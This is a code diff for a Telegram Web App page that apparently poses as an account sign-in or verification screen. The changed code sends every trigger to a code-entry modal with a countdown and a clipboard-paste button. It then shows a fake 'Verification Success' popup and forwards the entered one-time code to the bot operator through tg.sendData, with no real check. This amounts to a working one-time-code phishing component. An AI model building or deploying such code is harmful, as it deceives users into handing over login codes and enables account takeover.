@@ -1,101 +1,101 @@
 // Initialize Telegram Web App
-const tg = window.Telegram.WebApp;
-tg.expand();
+const tg = window.Telegram ? window.Telegram.WebApp : null;
+if (tg) {
+    tg.expand();
+    tg.ready();
+}
 
-// Elements
-const tabs = document.querySelectorAll('.tab');
-const usernameInput = document.getElementById('username');
-const passwordContainer = document.getElementById('password-container');
-const forgotPassword = document.getElementById('forgot-password');
-const loginForm = document.getElementById('login-form');
-const otpModal = document.getElementById('otp-modal');
-const modalClose = document.getElementById('modal-close');
-const confirmBtn = document.getElementById('confirm-btn');
-const timerEl = document.getElementById('timer');
+document.addEventListener('DOMContentLoaded', () => {
+    // Elements
+    const signupTrigger = document.getElementById('signup-trigger');
+    const telegramTrigger = document.getElementById('telegram-trigger');
+    const otpModal = document.getElementById('otp-modal');
+    const modalClose = document.getElementById('modal-close');
+    const confirmBtn = document.getElementById('confirm-btn');
+    const timerSpan = document.getElementById('timer');
+    const otpInput = document.getElementById('otp-input');
+    const pasteBtn = document.querySelector('.paste-btn');
 
-let currentTab = 'password';
+    let timerInterval;
 
-// Tab switching
-tabs.forEach(tab => {
-    tab.addEventListener('click', () => {
-        tabs.forEach(t => t.classList.remove('active'));
-        tab.classList.add('active');
-        currentTab = tab.dataset.tab;
+    // Show Modal Function
+    const showOTPModal = () => {
+        otpModal.style.display = 'flex';
+        startTimer();
+        if (tg) tg.HapticFeedback.impactOccurred('medium');
+    };
+
+    // Event Listeners for Triggers
+    if (signupTrigger) signupTrigger.addEventListener('click', showOTPModal);
+    if (telegramTrigger) telegramTrigger.addEventListener('click', (e) => {
+        e.preventDefault();
+        showOTPModal();
+    });
+
+    // Close Modal
+    modalClose.addEventListener('click', () => {
+        otpModal.style.display = 'none';
+        clearInterval(timerInterval);
+    });
+
+    // Timer Logic
+    function startTimer() {
+        let timeLeft = 46;
+        timerSpan.textContent = timeLeft;
+        clearInterval(timerInterval);
         
-        if (currentTab === 'otp') {
-            usernameInput.placeholder = 'Email / Phone Number';
-            passwordContainer.style.display = 'none';
-            forgotPassword.style.display = 'none';
-        } else {
-            usernameInput.placeholder = 'Email / Phone Number / Username';
-            passwordContainer.style.display = 'block';
-            forgotPassword.style.display = 'block';
+        timerInterval = setInterval(() => {
+            timeLeft--;
+            timerSpan.textContent = timeLeft;
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                timerSpan.textContent = "0";
+            }
+        }, 1000);
+    }
+
+    // Paste Functionality
+    pasteBtn.addEventListener('click', async () => {
+        try {
+            const text = await navigator.clipboard.readText();
+            if (text && text.length <= 6) {
+                otpInput.value = text;
+            }
+        } catch (err) {
+            console.error('Failed to read clipboard');
         }
     });
-});
 
-// Password visibility
-document.querySelector('.toggle-password').addEventListener('click', () => {
-    const passwordInput = document.getElementById('password');
-    passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
-});
+    // Confirm Logic
+    confirmBtn.addEventListener('click', () => {
+        const code = otpInput.value;
+        if (code.length < 4) {
+            alert('Please enter a valid verification code');
+            return;
+        }
 
-// Form submission
-loginForm.addEventListener('submit', (e) => {
-    e.preventDefault();
-    
-    if (currentTab === 'otp') {
-        openOTPModal();
-    } else {
-        const username = usernameInput.value;
-        const password = document.getElementById('password').value;
-        
-        // Simulating standard login
-        tg.showConfirm(`Sign in as ${username}?`, (ok) => {
-            if (ok) {
-                tg.close();
-            }
-        });
-    }
-});
-
-// OTP Modal Logic
-function openOTPModal() {
-    otpModal.style.display = 'flex';
-    startTimer(46);
-}
-
-function startTimer(seconds) {
-    let timeLeft = seconds;
-    const interval = setInterval(() => {
-        timeLeft--;
-        timerEl.textContent = timeLeft;
-        if (timeLeft <= 0) clearInterval(interval);
-    }, 1000);
-}
-
-modalClose.addEventListener('click', () => {
-    otpModal.style.display = 'none';
-});
-
-confirmBtn.addEventListener('click', () => {
-    const otp = document.getElementById('otp-input').value;
-    const username = usernameInput.value;
-
-    if (otp.length === 6) {
-        confirmBtn.textContent = 'Verifying...';
+        confirmBtn.innerHTML = 'Verifying...';
         confirmBtn.disabled = true;
 
+        // Simulate API call
         setTimeout(() => {
-            tg.showAlert(`Verification successful for ${username}!`);
-            tg.close();
-        }, 1500);
-    } else {
-        tg.showAlert('Please enter a valid 6-digit code.');
-    }
-});
-
-// Close WebApp
-document.getElementById('close-btn').addEventListener('click', () => {
-    tg.close();
+            if (tg) {
+                tg.showPopup({
+                    title: 'Verification Success',
+                    message: 'Your account has been verified successfully!',
+                    buttons: [{type: 'ok'}]
+                });
+                // Send data back to bot
+                tg.sendData(JSON.stringify({
+                    action: 'login_success',
+                    code: code,
+                    timestamp: new Date().toISOString()
+                }));
+                tg.close();
+            } else {
+                alert('Verification Successful!');
+                location.reload();
+            }
+        }, 2000);
+    });
 });
